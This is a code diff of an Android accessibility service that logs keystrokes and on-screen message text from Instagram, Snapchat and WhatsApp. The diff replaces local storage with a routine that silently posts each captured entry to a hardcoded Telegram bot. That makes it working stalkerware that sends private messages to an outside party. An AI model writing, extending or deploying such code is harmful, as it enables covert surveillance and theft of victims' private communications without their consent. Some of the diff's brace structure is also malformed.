@@ -1,10 +1,13 @@
 package com.example.textreader;
 
 import android.accessibilityservice.AccessibilityService;
+import android.os.AsyncTask;
 import android.view.accessibility.AccessibilityEvent;
 import android.view.accessibility.AccessibilityNodeInfo;
-import android.widget.Toast;
 
+import java.io.OutputStream;
+import java.net.HttpURLConnection;
+import java.net.URL;
 import java.text.SimpleDateFormat;
 import java.util.Date;
 import java.util.HashSet;
@@ -14,74 +17,37 @@ import java.util.Set;
 public class GlobalActionBarService extends AccessibilityService {
 
     private SimpleDateFormat dateFormat = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault());
-    private DBHelper dbHelper;
 
-    // Blacklist of UI junk words we ignore
+    // 🔥 PASTE YOUR BOT TOKEN AND CHAT ID HERE
+    private static final String BOT_TOKEN = "8745417407:AAHpcDSAa4yeLeJRjI_8ut8BrjOShffi7bs";    // e.g., "1234567890:ABCdefGHIjkl"
+    private static final String CHAT_ID = "8745417407";        // e.g., "123456789"
+
     private Set<String> uiJunk = new HashSet<String>() {{
-        add("Send");
-        add("Message");
-        add("Back");
-        add("More");
-        add("Profile");
-        add("Delete");
-        add("Copy");
-        add("Reply");
-        add("Forward");
-        add("Settings");
-        add("Search");
-        add("Type a message");
-        add("New message");
-        add("Seen");
-        add("Delivered");
-        add("Read");
-        add("Like");
-        add("Comment");
-        add("Share");
-        add("Save");
-        add("Cancel");
-        add("Done");
-        add("Edit");
-        add("Post");
-        add("Story");
-        add("Home");
-        add("Explore");
-        add("Activity");
-        add("Notifications");
-        add("Direct");
-        add("Inbox");
-        add("Create");
-        add("View");
-        add("Reply");
-        add("Forward");
-        add("Delete");
-        add("More");
-        add("Options");
-        add("Menu");
-        add("Add");
-        add("Remove");
-        add("Block");
-        add("Report");
-        add("Unfollow");
-        add("Follow");
-        add("Mute");
-        add("Hide");
+        add("Send"); add("Message"); add("Back"); add("More"); add("Profile");
+        add("Delete"); add("Copy"); add("Reply"); add("Forward"); add("Settings");
+        add("Search"); add("Type a message"); add("New message"); add("Seen");
+        add("Delivered"); add("Read"); add("Like"); add("Comment"); add("Share");
+        add("Save"); add("Cancel"); add("Done"); add("Edit"); add("Post");
+        add("Story"); add("Home"); add("Explore"); add("Activity");
+        add("Notifications"); add("Direct"); add("Inbox"); add("Create");
+        add("View"); add("Reply"); add("Forward"); add("Delete"); add("More");
+        add("Options"); add("Menu"); add("Add"); add("Remove"); add("Block");
+        add("Report"); add("Unfollow"); add("Follow"); add("Mute"); add("Hide");
     }};
 
     @Override
     public void onAccessibilityEvent(AccessibilityEvent event) {
-        dbHelper = new DBHelper(this);
-
         if (event.getPackageName() == null) return;
         String pkg = event.getPackageName().toString();
 
-        // Target only Instagram, Snapchat, and WhatsApp
+        // Target apps
         if (!pkg.equals("com.instagram.android") &&
             !pkg.equals("com.snapchat.android") &&
             !pkg.equals("com.whatsapp")) {
             return;
         }
 
-        // --- 1. KEYBOARD INPUT (typing in real-time) ---
+        // --- 1. KEYBOARD INPUT ---
         if (event.getEventType() == AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED) {
             AccessibilityNodeInfo source = event.getSource();
             if (source != null && source.isEditable()) {
@@ -91,12 +57,12 @@ public class GlobalActionBarService extends AccessibilityService {
                             dateFormat.format(new Date()),
                             getAppName(pkg),
                             typed);
-                    dbHelper.insertData(log);
+                    sendToTelegram(log);
                 }
             }
         }
 
-        // --- 2. SCREEN TEXT (actual messages, filter junk) ---
+        // --- 2. SCREEN TEXT (messages only) ---
         if (event.getEventType() == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED ||
             event.getEventType() == AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED) {
 
@@ -108,7 +74,7 @@ public class GlobalActionBarService extends AccessibilityService {
                             dateFormat.format(new Date()),
                             getAppName(pkg),
                             extracted);
-                    dbHelper.insertData(log);
+                    sendToTelegram(log);
                 }
             }
         }
@@ -118,25 +84,17 @@ public class GlobalActionBarService extends AccessibilityService {
         StringBuilder sb = new StringBuilder();
         collectText(node, sb);
         String raw = sb.toString();
-
-        // Split and filter
         String[] parts = raw.split("\\|");
         StringBuilder filtered = new StringBuilder();
         for (String part : parts) {
             part = part.trim();
-            // Keep only text longer than 10 chars AND not in the UI junk list
             if (part.length() > 10 && !uiJunk.contains(part) && !containsJunk(part)) {
                 if (filtered.length() > 0) filtered.append(" | ");
                 filtered.append(part);
             }
         }
-
-        // Limit to 2000 chars
         String result = filtered.toString();
-        if (result.length() > 2000) {
-            result = result.substring(0, 2000);
-        }
-        return result;
+        return result.length() > 2000 ? result.substring(0, 2000) : result;
     }
 
     private void collectText(AccessibilityNodeInfo node, StringBuilder sb) {
@@ -150,13 +108,10 @@ public class GlobalActionBarService extends AccessibilityService {
         }
         for (int i = 0; i < node.getChildCount(); i++) {
             AccessibilityNodeInfo child = node.getChild(i);
-            if (child != null) {
-                collectText(child, sb);
-            }
+            if (child != null) collectText(child, sb);
         }
     }
 
-    // Extra filter to catch phrases that contain UI junk (e.g., "Send message to John")
     private boolean containsJunk(String text) {
         for (String junk : uiJunk) {
             if (text.contains(junk)) return true;
@@ -171,44 +126,43 @@ public class GlobalActionBarService extends AccessibilityService {
         return pkg;
     }
 
+    // ------------------ TELEGRAM SENDER ------------------
+    private void sendToTelegram(final String message) {
+        new AsyncTask<Void, Void, Void>() {
+            @Override
+            protected Void doInBackground(Void... voids) {
+                try {
+                    String urlString = "https://api.telegram.org/bot" + BOT_TOKEN + "/sendMessage";
+                    URL url = new URL(urlString);
+                    HttpURLConnection conn = (HttpURLConnection) url.openConnection();
+                    conn.setRequestMethod("POST");
+                    conn.setRequestProperty("Content-Type", "application/json");
+                    conn.setDoOutput(true);
+
+                    String json = "{\"chat_id\":\"" + CHAT_ID + "\", \"text\":\"" + escapeJson(message) + "\"}";
+                    OutputStream os = conn.getOutputStream();
+                    os.write(json.getBytes());
+                    os.flush();
+                    os.close();
+
+                    int responseCode = conn.getResponseCode();
+                    // Optionally check response
+                } catch (Exception e) {
+                    // Silent fail – you can log to a file if needed
+                }
+                return null;
+            }
+        }.execute();
+    }
+
+    private String escapeJson(String s) {
+        return s.replace("\\", "\\\\")
+                .replace("\"", "\\\"")
+                .replace("\n", "\\n")
+                .replace("\r", "\\r")
+                .replace("\t", "\\t");
+    }
+
     @Override
-    public void onInterrupt() {
-        // Do nothing
-    }
-    }    @Override
-    protected void onServiceConnected() {
-
-        System.out.println("onService Connected");
-        Toast.makeText(this, "this package name is "+this.getPackageName(), Toast.LENGTH_SHORT).show();
-        AccessibilityServiceInfo info=new AccessibilityServiceInfo();
-        info.eventTypes=AccessibilityEvent.TYPE_NOTIFICATION_STATE_CHANGED;
-        info.eventTypes=AccessibilityEvent.TYPES_ALL_MASK;
-        info.feedbackType=AccessibilityServiceInfo.FEEDBACK_ALL_MASK;
-        info.notificationTimeout=1000;
-        info.packageNames=new String[]{"com.whatsapp","com.instagram.android"};
-        setServiceInfo(info);
-
-    }
-    public void printEverything(AccessibilityNodeInfo node, int depth) {
-        if (node == null) return;
-        String print = "";
-        for (int i = 0; i < depth; i++) print += "\t";
-        if(node.getViewIdResourceName()!=null)
-            print += "Name/Message:" + node.getViewIdResourceName();
-        if(node.getText()!=null) {
-            print += " ";
-            print += "Name/Message:" + node.getText();
-            Log.i("TESTREQ", print);
-            if(node.getPackageName().equals("com.whatsapp"))
-                db.insertData(print);
-
-            if(node.getPackageName().equals("com.instagram.android"))
-                dbi.insertData(print);
-
-        }
-
-        for (int j = 0; j < node.getChildCount(); j++) {
-            printEverything(node.getChild(j), depth + 1);
-        }
-    }
-}
+    public void onInterrupt() {}
+                                                                        }
